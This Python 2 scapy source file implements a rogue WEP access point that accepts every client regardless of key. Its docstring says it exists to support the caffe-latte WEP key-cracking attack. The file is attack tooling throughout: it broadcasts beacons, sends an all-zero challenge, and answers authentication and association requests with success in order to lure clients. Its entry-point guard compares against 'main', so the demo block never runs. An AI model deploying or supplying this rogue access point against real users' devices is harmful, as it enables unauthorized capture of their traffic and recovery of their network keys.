"""
This class will mimic the bahaviour of a WEP access point.
The only difference is that it always accepts connections no matter the key.
This is not possible with hostapd unfortunately and needed for the caffe-latte attack.
"""
import time
from scapy.layers.dot11 import *
from threading import Lock, Thread


# Copied from the scapy-fakeap project.
def _get_channel_bytestr(channel):
    if channel == 14:
        freq = 2484
    else:
        freq = 2407 + (channel * 5)

    freq_string = struct.pack("<h", freq)

    return freq_string

def radiotap(channel):
    return RadioTap(len=18, TSFT=None, Rate=2, Channel=_get_channel_bytestr(channel),
                    present=18478, notdecoded='\x01\x00\x00')

def dot11beacon(source, sc, ssid, channel, timestamp):
    return  Dot11(ID=0, type=0, subtype=8, addr2=source, addr3=source, addr1="ff:ff:ff:ff:ff:ff", addr4=None, SC=sc) / \
            Dot11Beacon(timestamp=timestamp, cap=1041, beacon_interval=100) / \
            Dot11Elt(info=ssid, ID='SSID', len=len(ssid)) / \
            Dot11Elt(info="\x0c\x12\x18\x24\x30\x48\x60\x6c", ID='Rates', len=len("\x0c\x12\x18\x24\x30\x48\x60\x6c")) / \
            Dot11Elt(info=chr(channel), ID='DSset', len=len(chr(channel)))

def dot11proberesp(source, destination, sc, ssid, channel, timestamp):
    return  Dot11(type=0, subtype=11, addr2=source, addr3=source, addr1=destination, addr4=None, SC=sc) / \
            Dot11ProbeResp(timestamp=timestamp, cap=1041, beacon_interval=100) / \
            Dot11Elt(info=ssid, ID='SSID')/\
            Dot11Elt(info='\\x82\\x84\\x8b\\x96\\x0c\\x12\\x18$', ID='Rates') / \
            Dot11Elt(info=chr(channel), ID='DSset')

# Always success authentication response
def dot11auth(source, destination, sc, is_challenge):
    seqnum = 2 if is_challenge else 4
    authp = Dot11(type=0, subtype=0x0B, addr1=destination, addr2=source, addr3=source, SC=sc) / \
            Dot11Auth(status=0, seqnum=seqnum, algo=1)

    if is_challenge:
        authp = authp / Dot11Elt(info='\x00' * 128, ID=16, len=128)  # Null byte challenge :P

    return authp

def dot11assoresp(source, destination, sc, aid, is_reasso):
    subtype = 0x03 if is_reasso else 0x01
    return  Dot11(type=0, subtype=subtype, addr1=destination, addr2=source, addr3=source, SC=sc)/\
            Dot11AssoResp(cap=1041, status=0, AID=aid) /\
            Dot11Elt(info='\\x82\\x84\\x8b\\x96\\x0c\\x12\\x18$', ID='Rates')



class MinimalWEP(object):

    def __init__(self, ssid, bssid, channel, interface):
        self.interface = interface
        self.ssid  = ssid
        self.bssid = bssid
        self.channel = channel
        self.sc, self.aid = 0, 0
        self.boot_time = time.time()
        self.sc_lock, self.aid_lock = Lock(), Lock()
        self.outgoing_socket = None
        self.is_up = False

    def _next_sc(self):
        self.sc_lock.acquire()
        self.sc = (self.sc + 1) % 4096
        temp = self.sc
        self.sc_lock.release()

        return temp * 16  # Fragment number -> right 4 bits

    def _next_aid(self):
        self.aid_lock.acquire()
        self.aid = (self.aid + 1) % 2008
        temp = self.aid
        self.aid_lock.release()

        return temp

    def current_timestamp(self):
        return int((time.time() - self.boot_time) * 1000000)

    def beacon_loop(self):
        beacon_packet = radiotap(self.channel) / \
                        dot11beacon(self.bssid, self._next_sc(), self.ssid, self.channel, self.current_timestamp())

        self.outgoing_socket = conf.L2socket(iface=self.interface)
        while self.is_up:
            try:
                self.outgoing_socket.send(beacon_packet)
                time.sleep(.12)
            except:
                print "Exception when sending Beacon..."
                break

    def start(self):
        self.is_up = True
        self.beacon_sender = Thread(target = self.beacon_loop)
        self.beacon_sender.start()

    def shutdown(self):
        self.is_up = False
        self.beacon_sender.join()

    def respond_to_packet(self, packet):
        if Dot11 in packet:

            # If not directly for us or broadcast, drop it.
            if  packet[Dot11].addr1 != self.bssid:
                return

            response_destination = packet[Dot11].addr2  # Destination is previous source

            if Dot11ProbeReq in packet:  # Probe request
                if Dot11Elt in packet:
                    ssid = packet[Dot11Elt].info

                    if ssid == self.ssid:
                        self.send_probe_response(response_destination)
                        print "Received probe request, responded with probe response."

            elif Dot11Auth in packet:  # Authentication means the client is requesting a challenge
                self.send_auth_response(response_destination, True)
                print "Received auth request, responded with WEP challenge."

            elif Dot11WEP in packet: # It's is the response to the previously sent challenge
                self.send_auth_response(response_destination, False)
                print "Received WEP challenge-response packet, responded with success message."

            elif Dot11AssoReq in packet or Dot11ReassoReq in packet:
                self.send_asso_response(response_destination, Dot11ReassoReq in packet)
                print "Received asso request, responded with asso response."

    def send_probe_response(self, destination):
        probe_response =    radiotap(self.channel) / \
                            dot11proberesp( self.bssid, destination, self._next_sc(),
                                            self.ssid, self.channel, self.current_timestamp())

        if self.is_up:
            self.outgoing_socket.send(probe_response)

    def send_auth_response(self, destination, is_challenge):
        auth_response = radiotap(self.channel) / \
                        dot11auth(self.bssid, destination, self._next_sc(), is_challenge)

        if self.is_up:
            self.outgoing_socket.send(auth_response)

    def send_asso_response(self, destination, is_reasso):
        asso_response = radiotap(self.channel) / \
                        dot11assoresp(self.bssid, destination, self._next_sc(), self._next_aid(), is_reasso)

        if self.is_up:
            self.outgoing_socket.send(asso_response)


if __name__ == "main":
    minwep = MinimalWEP("wep_test", "aa:bb:cc:dd:ee:ff", 1, "wlan1")
    minwep.start()
    while True:
        try:
            sniff(iface="wlan1", prn = minwep.respond_to_packet)  #, filter = "wlan type management and wlan addr1 {}".format("aa:bb:cc:dd:ee:ff"))
        except Exception as e:
            print str(e)
            minwep.shutdown()
